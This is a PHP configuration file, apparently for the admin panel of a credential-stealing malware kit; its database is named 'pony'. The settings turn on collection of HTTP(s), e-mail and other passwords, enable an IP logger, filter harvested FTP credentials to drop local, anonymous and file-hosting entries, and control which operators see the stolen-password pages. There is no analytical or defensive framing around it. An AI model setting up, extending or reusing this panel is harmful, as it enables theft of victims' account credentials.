<?php

// mysql settings
$mysql_host = '127.0.0.1';
$mysql_user = 'user';
$mysql_pass = 'pass';
$mysql_database = 'pony';

$global_directory_slash = DIRECTORY_SEPARATOR;
$global_temporary_directory = 'temp';

// debug settings
$global_verbose_log = false; // improved verbose log, use for debugging only!
$global_allow_all_ftp = false; // disable filtering, set 'true' for testing purposes only!

$global_filter_list = array(
    '127.0.0.1',
    '192.168.',
    'localhost',
    'nonymous',
    'bitshare.com',
    'depositfiles.com',
    'filesonic.com',
    'gigapeta.com',
    'hotfile.com',
    'ifolder.ru',
    'letitbit.net',
    'sms4file.com',
    'turbobit.ru',
    'uploadbox.com',
    'vip-file.com',
    'wupload.com',
);

// accept connections from white-list IPs only
$white_list = array(
	// add at least one IP to enable white-list mode
	//"127.0.0.1",
);

date_default_timezone_set('Europe/Moscow');
$enable_http_mode = true; // collect HTTP(s) passwords
$show_help_to_users = true; // hide help for non admin accounts
$show_http_to_users = true; // hide HTTP password page for non admin accounts
$show_logons_to_users = true; // do not show IP logger for non admin accounts
$disable_ip_logger = false; // disable IP logger
$enable_email_mode = true; // collect E-mail passwords
$show_email_to_users = true; // hide E-mail password page for non admin accounts
$show_other_to_users = true; // hide Other password page for non admin accounts
$use_mysql_persist_connections = false; // use mysql persist connections
$show_domains = true; // hide ping domains page & functions
$show_domains_to_users = true; // hide ping domains page for non admin accounts
